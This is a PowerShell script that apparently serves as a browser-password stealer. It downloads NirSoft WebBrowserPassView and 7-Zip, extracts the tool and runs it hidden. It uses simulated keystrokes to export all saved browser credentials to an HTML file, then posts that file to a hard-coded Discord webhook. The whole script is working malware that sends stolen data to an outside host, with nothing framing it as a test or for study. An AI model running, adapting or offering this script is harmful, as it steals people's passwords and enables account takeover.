$tmpFolder = "C:\temp"

# Ensure the temporary folder is clean
if (Test-Path $tmpFolder) { 
    Remove-Item $tmpFolder -Recurse -Force -ErrorAction SilentlyContinue 
}

New-Item -ItemType Directory -Path $tmpFolder | Out-Null
Set-Location $tmpFolder

Start-Sleep -Seconds 3

$wbpvUrl = 'http://www.nirsoft.net/toolsdownload/webbrowserpassview.zip'
$wbpvZip = 'wbpv.zip'
$sevenZipUrl = 'https://www.7-zip.org/a/7za920.zip'
$sevenZipZip = '7z.zip'
$extractionPassword = 'wbpv28821@'
$filePath = Join-Path -Path $tmpFolder -ChildPath 'export.htm'

$refererHeader = @{'Referer' = 'http://www.nirsoft.net/utils/web_browser_password.html'}

# Download the required files
Invoke-WebRequest -Headers $refererHeader -Uri $wbpvUrl -OutFile $wbpvZip
Invoke-WebRequest -Uri $sevenZipUrl -OutFile $sevenZipZip

Start-Sleep -Seconds 5

# Extract the 7-Zip archive
Expand-Archive -Path $sevenZipZip -DestinationPath '7z'

$sevenZipPath = '.\7z\7za.exe'
$extractionArgs = "e", $wbpvZip, "-p$extractionPassword"

# Extract the WebBrowserPassView executable
Start-Process -FilePath $sevenZipPath -ArgumentList $extractionArgs -Wait

# Start the WebBrowserPassView process
$process = Start-Process -FilePath '.\WebBrowserPassView.exe' -WindowStyle Hidden -PassThru

Add-Type -AssemblyName System.Windows.Forms

Start-Sleep -Seconds 3

# Simulate key presses to save the file
[System.Windows.Forms.SendKeys]::SendWait('^a')  # CTRL + A
[System.Windows.Forms.SendKeys]::SendWait('^s')  # CTRL + S

Start-Sleep -Seconds 5

$savePath = "C:\temp\export.htm"
[System.Windows.Forms.SendKeys]::SendWait($savePath)
[System.Windows.Forms.SendKeys]::SendWait('{ENTER}')

Start-Sleep -Seconds 3

# Check if the file was created and send it via webhook
if (Test-Path $filePath) {
    $webhookUrl = "https://discord.com/api/webhooks/1333404978911510651/FVr2hApcOYlBDhSDad7s0Zr_kCIts4bBRz9OjYXOVsHH-uaY3nR3fNqP0bQ7lQSOGbRX"
    
    # Read the file content and prepare the body for the webhook
    $fileContent = Get-Content -Path $filePath -Raw
    if (-not [string]::IsNullOrWhiteSpace($fileContent)) {
        $body = @{
            file1 = $fileContent
        }

        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType 'application/json'
    } else {
        Write-Host "The file is empty, cannot send an empty message."
    }
} else {
    Write-Host "The file was not found."
}
